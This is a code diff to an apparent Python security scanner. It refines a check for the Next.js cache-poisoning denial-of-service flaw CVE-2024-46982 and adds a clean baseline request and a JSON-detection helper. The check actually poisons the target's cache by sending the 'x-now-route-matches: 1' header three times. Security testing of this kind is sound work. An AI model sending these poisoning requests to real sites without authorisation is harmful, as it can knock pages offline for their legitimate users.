@@ -14,15 +14,42 @@ from utils.utils import configure_logger, requests, sys
 logger = configure_logger(__name__)
 
 
+def _is_json(response: requests.Response) -> bool:
+    """Vrai si la réponse est du JSON (Content-Type puis parsing)."""
+    if "application/json" in response.headers.get("Content-Type", ""):
+        return True
+    try:
+        response.json()
+        return True
+    except ValueError:
+        return False
+
+
 def test_nextjs_dos(
     url: str,
     uri: str,
     s: requests.Session,
     authent: tuple[str, str] | None = None,
 ) -> bool:
+    """
+    Confirme l'empoisonnement du cache sans se fier aux seuls headers.
+
+    Méthodo : on établit d'abord une baseline PROPRE de l'URL cible (qui ne doit
+    PAS déjà servir du JSON, sinon aucune conclusion possible), on rejoue 3x la
+    requête empoisonnée (header `x-now-route-matches: 1`), puis on rejoue une
+    requête PROPRE : le cache est confirmé empoisonné seulement si cette réponse
+    propre a basculé en JSON alors que la baseline ne l'était pas.
+    """
+    # Baseline propre : si l'URL sert déjà du JSON, le test n'est pas concluant.
+    req_baseline = s.get(
+        uri, verify=False, auth=authent, timeout=10, allow_redirects=False
+    )
+    if _is_json(req_baseline):
+        logger.debug("baseline already JSON, inconclusive for %s", uri)
+        return False
 
     headers = {"x-now-route-matches": "1"}
-    
+
     for _ in range(3):
         s.get(
             uri,
@@ -32,28 +59,22 @@ def test_nextjs_dos(
             timeout=10,
             allow_redirects=False,
         )
-    
+
+    # Requête propre finale : a-t-elle basculé en JSON pour un client propre ?
     req_verify = s.get(
         uri,
         verify=False,
         auth=authent,
         timeout=10,
-        allow_redirects=False
+        allow_redirects=False,
     )
-    
-    try:
-        req_verify.json()
+
+    if _is_json(req_verify):
         print(
             f" {Identify.confirmed} | CVE-2024-46982 | CACHE POISONED | {Colors.BLUE}{uri}{Colors.RESET}"
         )
         return True
-    except requests.exceptions.JSONDecodeError:
-        if "application/json" in req_verify.headers.get("Content-Type", ""):
-            print(
-                f" {Identify.confirmed} | CVE-2024-46982 | CACHE POISONED | {Colors.BLUE}{uri}{Colors.RESET}"
-            )
-            return True
-    
+
     return False
 
 
